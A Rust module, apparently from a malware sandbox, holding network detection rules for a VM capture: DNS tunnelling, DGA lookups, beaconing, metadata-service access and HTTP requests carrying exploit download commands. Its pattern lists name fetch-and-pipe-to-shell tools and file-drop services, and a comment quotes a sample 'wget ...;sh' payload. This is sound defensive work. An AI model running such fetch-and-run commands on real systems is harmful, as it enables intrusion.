// SPDX-License-Identifier: GPL-3.0-only
//! Rules for what the capture shows: DNS names, HTTP requests and TLS or SSH sessions.
//!
//! Packets are for the whole VM: nothing in a frame names the process that sent
//! it. A row is tied to a task only when that task's own calls reached the same
//! address, and is otherwise marked VM-wide. Frames of VM housekeeping (the
//! base's own time sync, mirrors and name service discovery) are not evaluated.
use super::super::*;
use super::noise::Gaps;
use super::state::{Contact, Window};
use super::Hit;
use std::collections::BTreeMap;
use std::net::IpAddr;

pub const NS: u64 = 1_000;
/// The built-in suppression list changes with the rules.
pub const SUPPRESSION_VERSION: u32 = 1;
pub const MINUTE_US: u64 = 60 * 1_000_000;
pub const NXDOMAINS: usize = 10;
pub const LONG_LABEL: usize = 40;
pub const TUNNEL_QUERIES: usize = 5;
pub const TXT_QUERIES: usize = 20;
pub const BEACON_REQUESTS: u64 = 8;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum FrameKind {
    Dns,
    Http,
    Session,
}

/// A row of the capture as the rules see it.
pub struct Frame<'a> {
    pub kind: FrameKind,
    pub values: &'a [(&'static str, RowValue)],
    pub destination: &'a str,
    pub port: &'a str,
}

impl Frame<'_> {
    pub fn text(&self, key: &str) -> &str {
        self.values
            .iter()
            .find_map(|(name, value)| match value {
                RowValue::Text(text) if *name == key => Some(text.as_str()),
                _ => None,
            })
            .unwrap_or("")
    }

    pub fn number(&self, key: &str) -> Option<u64> {
        files::number(self.values, key)
    }

    pub fn list(&self, key: &str) -> &[String] {
        self.values
            .iter()
            .find_map(|(name, value)| match value {
                RowValue::List(list) if *name == key => Some(list.as_slice()),
                _ => None,
            })
            .unwrap_or_default()
    }

    pub fn port(&self) -> Option<u16> {
        self.port.parse().ok()
    }
}

/// What the rules remember across frames.
#[derive(Clone, Default)]
pub struct Frames {
    /// Some resolver answered a name: failed lookups mean something.
    pub resolver_answers: bool,
    pub nxdomain: Window<String>,
    pub nxdomain_done: bool,
    /// The burst of failed names, with the frame it completed on, to report once a
    /// resolver is known to answer.
    pub nxdomain_hit: Option<(Hit, u64, String, u64)>,
    pub long_labels: BTreeMap<String, u64>,
    pub text_queries: BTreeMap<String, Window<u64>>,
    pub tunnel_done: std::collections::BTreeSet<String>,
    pub beats: BTreeMap<String, (Gaps, u64)>,
    pub beat_done: std::collections::BTreeSet<String>,
    /// Frames the suppression list skipped.
    pub suppressed: u64,
    /// Every address a DNS answer of the run gave: a connect to one of
    /// these is to a named server, not a hard-coded one.
    pub resolved: std::collections::BTreeSet<IpAddr>,
    /// HTTP requests that carried a download command (`lateral.exploit_payload`).
    pub exploit_requests: u64,
}

/// Names the base looks up by itself: time sync, package mirrors and connectivity checks.
pub const HOUSEKEEPING_NAMES: &[&str] = &[
    "pool.ntp.org",
    "ntp.ubuntu.com",
    "time.cloudflare.com",
    "time.google.com",
    "time.windows.com",
    "time.apple.com",
    "time.nist.gov",
    "deb.debian.org",
    "security.debian.org",
    "ftp.debian.org",
    "archive.ubuntu.com",
    "security.ubuntu.com",
    "ports.ubuntu.com",
    "connectivity-check.ubuntu.com",
    "detectportal.firefox.com",
    "captive.apple.com",
    "msftconnecttest.com",
    "dl-cdn.alpinelinux.org",
    "mirrors.kernel.org",
];
/// Link-local discovery: mDNS and LLMNR names and ports.
pub const HOUSEKEEPING_PORTS: &[u16] = &[5353, 5355, 67, 68, 123];

/// Services that carry commands, files or messages for ordinary programs too.
pub const WEB_SERVICES: &[&str] = &[
    "api.telegram.org",
    "pastebin.com",
    "paste.ee",
    "raw.githubusercontent.com",
    "gist.githubusercontent.com",
    "transfer.sh",
    "file.io",
    "0x0.st",
    "termbin.com",
    "hastebin.com",
    "anonfiles.com",
    "discord.com",
    "discordapp.com",
    "api.github.com",
    "ipfs.io",
    "ngrok.io",
];
pub const WEB_PORTS: &[u16] = &[80, 8080, 8000, 8008, 8888, 3000, 5000, 443, 8443];
pub const TLS_PORTS: &[u16] = &[443, 8443, 853, 993, 995, 465, 636, 5223, 4443];

pub fn under_domain(name: &str, domain: &str) -> bool {
    name == domain
        || name
            .strip_suffix(domain)
            .is_some_and(|rest| rest.ends_with('.'))
}

pub fn housekeeping(name: &str) -> bool {
    name.ends_with(".local")
        || name.ends_with(".lan")
        || name.starts_with("_")
        || matches!(name, "wpad" | "isatap" | "localhost")
        || HOUSEKEEPING_NAMES
            .iter()
            .any(|domain| under_domain(name, domain))
}

pub fn entropy(text: &str) -> f64 {
    let mut counts = [0u32; 256];
    for byte in text.bytes() {
        counts[usize::from(byte)] += 1;
    }
    let total = text.len() as f64;
    counts
        .iter()
        .filter(|count| **count > 0)
        .map(|count| {
            let p = f64::from(*count) / total;
            -p * p.log2()
        })
        .sum()
}

/// A label of a made-up name: long enough, and as mixed as random letters and digits.
pub fn random_looking(label: &str) -> bool {
    label.len() >= 10 && entropy(label) >= 3.0 && label.bytes().all(|b| b.is_ascii_alphanumeric())
}

pub fn parent(name: &str) -> String {
    let labels: Vec<_> = name.split('.').collect();
    labels[labels.len().saturating_sub(2)..].join(".")
}

pub fn service(name: &str, uri: &str) -> bool {
    WEB_SERVICES.iter().any(|domain| under_domain(name, domain))
        && !(name.ends_with("discord.com") && !uri.is_empty() && !uri.starts_with("/api/webhooks"))
}

/// Judge one row of the capture.
pub fn rules(st: &mut super::state::State, frame: &Frame) -> Vec<Hit> {
    let mut hits = Vec::new();
    let time = frame.number("frame.time_us").unwrap_or(0);
    let state = &mut st.frames;
    if frame
        .port()
        .is_some_and(|port| HOUSEKEEPING_PORTS.contains(&port) && port != 123 || port == 123)
    {
        state.suppressed += 1;
        return hits;
    }
    match frame.kind {
        FrameKind::Dns => {
            let name = frame
                .text("dns.name")
                .trim_end_matches('.')
                .to_ascii_lowercase();
            if name.is_empty() {
                return hits;
            }
            if housekeeping(&name) {
                state.suppressed += 1;
                return hits;
            }
            let rcode = frame.number("dns.rcode");
            if rcode == Some(0) && !frame.list("dns.answers").is_empty() {
                state.resolver_answers = true;
            }
            for answer in frame.list("dns.answers") {
                for word in answer.split(|c: char| c.is_whitespace() || c == ',') {
                    if let Ok(ip) = word.parse::<IpAddr>() {
                        if state.resolved.len() < 65_536 {
                            state.resolved.insert(ip);
                        }
                    }
                }
            }
            let first = name.split('.').next().unwrap_or("");
            if rcode == Some(3) && random_looking(first) {
                state.nxdomain.push(time, MINUTE_US, name.clone());
                if !state.nxdomain_done && state.nxdomain.distinct() >= NXDOMAINS {
                    state.nxdomain_done = true;
                    let hit = Hit::new(
                        "network.dga_nxdomain",
                        parent(&name),
                        format!(
                            "{} lookups of random-looking names failed within a minute",
                            state.nxdomain.distinct()
                        ),
                    );
                    let number = frame.number("frame.number").unwrap_or(0);
                    state.nxdomain_hit =
                        Some((hit, number, frame.text("capture.path").to_owned(), 0));
                }
            }
            let domain = parent(&name);
            if name.split('.').any(|label| label.len() > LONG_LABEL) {
                let count = state.long_labels.entry(domain.clone()).or_default();
                *count += 1;
                if *count >= TUNNEL_QUERIES as u64 && state.tunnel_done.insert(domain.clone()) {
                    hits.push(Hit::new(
                        "network.dns_tunnel",
                        &domain,
                        format!("{count} queries with labels over 40 characters to {domain}"),
                    ));
                }
            }
            if matches!(frame.text("dns.type"), "TXT" | "NULL") {
                let queries = state.text_queries.entry(domain.clone()).or_default();
                queries.push(time, MINUTE_US, time);
                if queries.len() >= TXT_QUERIES && state.tunnel_done.insert(format!("{domain}/txt"))
                {
                    hits.push(Hit::new(
                        "network.dns_tunnel",
                        format!("{domain} text"),
                        format!(
                            "{} TXT or NULL queries to {domain} within a minute",
                            queries.len()
                        ),
                    ));
                }
            }
            if name.ends_with(".onion") {
                hits.push(Hit::new(
                    "network.tor",
                    &name,
                    format!("lookup of the hidden service {name}"),
                ));
            }
            if matches!(
                name.as_str(),
                "metadata.google.internal" | "metadata.tencentyun.com"
            ) {
                hits.push(Hit::new(
                    "credential.cloud_metadata",
                    &name,
                    "lookup of the instance metadata service".into(),
                ));
            }
            if service(&name, "") {
                hits.push(Hit::new(
                    "network.web_service",
                    &name,
                    format!("lookup of {name}"),
                ));
            }
        }
        FrameKind::Http => {
            let host = frame.text("http.host").to_ascii_lowercase();
            let uri = frame.text("http.uri");
            let name = host.split(':').next().unwrap_or("").to_owned();
            if name.is_empty() {
                return hits;
            }
            if housekeeping(&name) {
                state.suppressed += 1;
                return hits;
            }
            if name.parse::<IpAddr>().is_ok() {
                if matches!(
                    name.as_str(),
                    "169.254.169.254" | "169.254.170.2" | "169.254.0.23" | "100.100.100.200"
                ) {
                    hits.push(Hit::new(
                        "credential.cloud_metadata",
                        &name,
                        format!("HTTP request to the metadata service {name}{uri}"),
                    ));
                } else {
                    hits.push(Hit::new("network.ip_literal", &name, format!("HTTP request to the address {name}, which no lookup in the run produced")));
                }
            }
            if matches!(
                name.as_str(),
                "metadata.google.internal" | "metadata.tencentyun.com"
            ) {
                hits.push(Hit::new(
                    "credential.cloud_metadata",
                    &name,
                    format!("HTTP request to {name}{uri}"),
                ));
            }
            if service(&name, uri) {
                hits.push(Hit::new(
                    "network.web_service",
                    format!("{name}{uri}"),
                    format!("HTTP request to {name}{uri}"),
                ));
            }
            if name.ends_with(".onion") {
                hits.push(Hit::new(
                    "network.tor",
                    &name,
                    format!("HTTP request to the hidden service {name}"),
                ));
            }
            if let Some(port) = frame.port().filter(|port| !WEB_PORTS.contains(port)) {
                hits.push(Hit::new(
                    "network.nonstandard_port",
                    format!("{name}:{port}"),
                    format!("HTTP on port {port} ({name})"),
                ));
            }
            let body = frame.text("http.body");
            if let Some(command) = exploit_payload(uri).or_else(|| exploit_payload(body)) {
                state.exploit_requests += 1;
                let port = frame
                    .port()
                    .map_or_else(String::new, |port| format!(" on port {port}"));
                hits.push(
                    Hit::new(
                        "lateral.exploit_payload",
                        format!("HTTP{port}"),
                        format!("HTTP request to {name}{port} carrying the command {command}"),
                    )
                    .detail(format!(
                        "First request: {}",
                        super::exec::short(&format!("{name}{uri}"))
                    )),
                );
            }
            beat(state, &name, time, &mut hits);
        }
        FrameKind::Session => {
            let name = frame.text("session.server_name").to_ascii_lowercase();
            let protocol = frame.text("session.protocol");
            let kind = frame.text("session.kind");
            if kind == "client hello" && !name.is_empty() {
                if housekeeping(&name) {
                    state.suppressed += 1;
                    return hits;
                }
                if service(&name, "") {
                    hits.push(Hit::new(
                        "network.web_service",
                        &name,
                        format!("TLS session to {name}"),
                    ));
                }
                if name.ends_with(".onion") {
                    hits.push(Hit::new(
                        "network.tor",
                        &name,
                        format!("TLS session to the hidden service {name}"),
                    ));
                }
                beat(state, &name, time, &mut hits);
            }
            // A TLS hello with no server name to a public address no lookup
            // gave: an implant calling a hard-coded server (A33).
            if kind == "client hello" && name.is_empty() && protocol.contains("TLS") {
                if let Ok(ip) = frame.destination.parse::<IpAddr>() {
                    if !super::network::private(ip) && !state.resolved.contains(&ip) {
                        hits.push(Hit::new(
                            "network.tls_ip_literal",
                            ip.to_string(),
                            format!(
                                "TLS session to the address {ip}{} with no server name",
                                frame
                                    .port()
                                    .map_or_else(String::new, |port| format!(":{port}"))
                            ),
                        ));
                    }
                }
            }
            if let Some(port) = frame.port() {
                let ssh = protocol.eq_ignore_ascii_case("ssh")
                    || frame.text("session.details").starts_with("SSH-");
                let tls = !ssh
                    && (protocol.contains("TLS") || protocol.contains("QUIC") || !name.is_empty());
                let unusual = (ssh && port != 22)
                    || (tls && !TLS_PORTS.contains(&port) && kind == "client hello");
                if unusual {
                    let what = if ssh { "SSH" } else { "TLS" };
                    let target = if name.is_empty() {
                        frame.destination.to_owned()
                    } else {
                        name.clone()
                    };
                    hits.push(Hit::new(
                        "network.nonstandard_port",
                        format!("{target}:{port}"),
                        format!("{what} on port {port} ({target})"),
                    ));
                }
            }
        }
    }
    hits
}

/// The download command an HTTP request line or body carries, when it is an
/// exploit's payload (A15): `wget`, `curl`, `tftp`, `ftpget` or `busybox`
/// with a URL, a shell or a pipe, after URL decoding (`nas_sharing.cgi?...
/// wget http://x/ghost.sh;sh`, an xwiki Groovy call that runs `wget ...|sh`).
pub fn exploit_payload(text: &str) -> Option<String> {
    if text.is_empty() {
        return None;
    }
    let decoded = percent_decode(text);
    payload_in(&decoded).or_else(|| {
        // A query value in base64 (`nas_sharing.cgi?...&system=ZWNobyAt...`),
        // perhaps of `echo -e '\x77\x67...'`.
        decoded
            .split(['?', '&', '=', ';'])
            .filter(|value| value.len() >= 16)
            .filter_map(base64_text)
            .find_map(|inner| payload_in(&hex_unescape(&inner)))
    })
}

fn payload_in(decoded: &str) -> Option<String> {
    let lower = decoded.to_ascii_lowercase();
    let fetcher = [
        "wget ",
        "curl ",
        "tftp ",
        "ftpget ",
        "busybox wget",
        "busybox tftp",
    ]
    .iter()
    .filter_map(|word| lower.find(word))
    .min()?;
    let rest = &lower[fetcher..];
    let runs = rest.contains("http://")
        || rest.contains("https://")
        || rest.contains("|sh")
        || rest.contains("| sh")
        || rest.contains(";sh")
        || rest.contains("; sh")
        || rest.contains("chmod")
        || rest.contains("-g ");
    runs.then(|| {
        let end = decoded[fetcher..]
            .char_indices()
            .nth(120)
            .map_or(decoded.len(), |(at, _)| fetcher + at);
        decoded[fetcher..end].trim().to_owned()
    })
}

/// Standard base64 (padding optional) decoded to text, when all of
/// `value` is base64 and the result is mostly printable.
fn base64_text(value: &str) -> Option<String> {
    let digit = |c: u8| match c {
        b'A'..=b'Z' => Some(c - b'A'),
        b'a'..=b'z' => Some(c - b'a' + 26),
        b'0'..=b'9' => Some(c - b'0' + 52),
        b'+' | b'-' => Some(62),
        b'/' | b'_' => Some(63),
        _ => None,
    };
    let trimmed = value.trim_end_matches('=');
    let mut bits = 0u32;
    let mut held = 0;
    let mut out = Vec::new();
    for byte in trimmed.bytes() {
        bits = (bits << 6) | u32::from(digit(byte)?);
        held += 6;
        if held >= 8 {
            held -= 8;
            out.push((bits >> held) as u8);
            bits &= (1 << held) - 1;
        }
    }
    let printable = out
        .iter()
        .filter(|b| b.is_ascii_graphic() || **b == b' ')
        .count();
    (out.len() >= 8 && printable * 10 >= out.len() * 9)
        .then(|| String::from_utf8_lossy(&out).into_owned())
}

/// `\xNN` escapes decoded (`echo -e '\x77\x67\x65\x74'` is `wget`).
fn hex_unescape(text: &str) -> String {
    let bytes = text.as_bytes();
    let hex = |byte: u8| char::from(byte).to_digit(16);
    let mut out = Vec::with_capacity(bytes.len());
    let mut at = 0;
    while at < bytes.len() {
        if bytes[at] == b'\\' && at + 3 < bytes.len() && bytes[at + 1] == b'x' {
            if let (Some(high), Some(low)) = (hex(bytes[at + 2]), hex(bytes[at + 3])) {
                out.push((high * 16 + low) as u8);
                at += 4;
                continue;
            }
        }
        out.push(bytes[at]);
        at += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// `%xx` and `+` decoded, invalid escapes kept as they are.
fn percent_decode(text: &str) -> String {
    let hex = |byte: u8| char::from(byte).to_digit(16);
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut at = 0;
    while at < bytes.len() {
        match bytes[at] {
            b'%' if at + 2 < bytes.len() => {
                if let (Some(high), Some(low)) = (hex(bytes[at + 1]), hex(bytes[at + 2])) {
                    out.push((high * 16 + low) as u8);
                    at += 3;
                    continue;
                }
                out.push(b'%');
            }
            b'+' => out.push(b' '),
            byte => out.push(byte),
        }
        at += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Requests to one host at a steady pace.
pub fn beat(state: &mut Frames, host: &str, time: u64, hits: &mut Vec<Hit>) {
    let entry = state.beats.entry(host.to_owned()).or_default();
    entry.0.add(time * NS);
    entry.1 += 1;
    if entry.1 >= BEACON_REQUESTS && state.beat_done.len() < 4096 {
        if let Some(period) = entry.0.period() {
            if state.beat_done.insert(host.to_owned()) {
                hits.push(Hit::new(
                    "network.beacon",
                    host,
                    format!(
                        "{} requests to {host} about every {}",
                        entry.1,
                        super::noise::pace(period)
                    ),
                ));
            }
        }
    }
}

/// The task whose own calls reached this address, if any.
pub fn contact<'a>(st: &'a super::state::State, frame: &Frame) -> Option<&'a Contact> {
    match frame.kind {
        FrameKind::Dns => st.dns_task.as_ref(),
        _ => frame
            .destination
            .parse::<IpAddr>()
            .ok()
            .and_then(|ip| st.contacted.get(&ip)),
    }
}
